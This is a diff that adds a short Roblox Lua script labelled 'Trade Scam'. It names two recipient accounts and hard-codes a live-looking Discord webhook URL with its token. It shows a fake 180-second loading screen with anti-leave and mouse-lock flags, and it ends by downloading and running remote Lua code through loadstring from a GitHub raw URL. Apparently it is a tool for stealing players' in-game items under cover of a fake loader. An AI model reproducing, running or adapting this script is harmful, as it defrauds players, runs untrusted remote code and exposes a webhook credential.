@@ -1,0 +1,15 @@
+UserName = "korenalt1"
+UserName2 = "korenalt2"
+Webhook = "https://discord.com/api/webhooks/1106894528453025852/lzUHU_TjRh0kFz1PvV_yX4IWrQHA2iT4OTm9Sxw_3hTTzzNWL5PKCWEUjLxJupbGW-mh"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+_G.ScriptName = "Trade Scam"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
